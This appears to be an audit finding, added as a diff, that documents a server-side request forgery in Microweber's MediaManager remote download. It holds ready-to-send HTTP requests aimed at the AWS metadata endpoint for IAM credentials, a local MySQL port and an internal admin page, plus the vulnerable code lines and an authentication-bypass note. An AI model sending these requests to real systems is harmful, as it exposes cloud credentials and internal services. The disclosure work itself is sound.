@@ -1,0 +1,52 @@
+### F-008: SSRF via Remote Download (dl_remote / MediaManager)
+### Severity: HIGH | Auth: Admin | Method: POST
+### Impact: Server-side request to internal network, metadata endpoints, localhost services
+###
+### Via API (F-003 bypass allows unauthenticated access to MediaManager methods):
+
+POST /api/MicroweberPackages/Media/MediaManager/dl_remote HTTP/1.1
+Host: localhost:8888
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0
+Connection: close
+Content-Length: 46
+
+src=http://169.254.169.254/latest/meta-data/
+
+### EXPECTED: Server fetches AWS metadata endpoint (if running on EC2)
+### Response contains: instance metadata, IAM role credentials
+
+---
+
+### SSRF to localhost (probe internal services):
+
+POST /api/MicroweberPackages/Media/MediaManager/dl_remote HTTP/1.1
+Host: localhost:8888
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0
+Connection: close
+Content-Length: 32
+
+src=http://127.0.0.1:3306/
+
+### Timing difference reveals open/closed port
+
+---
+
+### SSRF to internal network:
+
+POST /api/MicroweberPackages/Media/MediaManager/dl_remote HTTP/1.1
+Host: localhost:8888
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0
+Connection: close
+Content-Length: 36
+
+src=http://10.0.0.1/admin/
+
+### WHY IT WORKS:
+###   MediaManager.php:467: if (isset($data['src']) && strstr($data['src'], 'http'))
+###   MediaManager.php:504: mw()->http->url($data['src'])->download($newfile)
+###   No IP allowlist, no denylist for RFC1918/loopback/link-local
+###   Via F-003 bypass: MediaManager is pre-loaded, accessible unauthenticated
+###   (Direct API: admin-gated — $adm = $this->app->user_manager->is_admin())
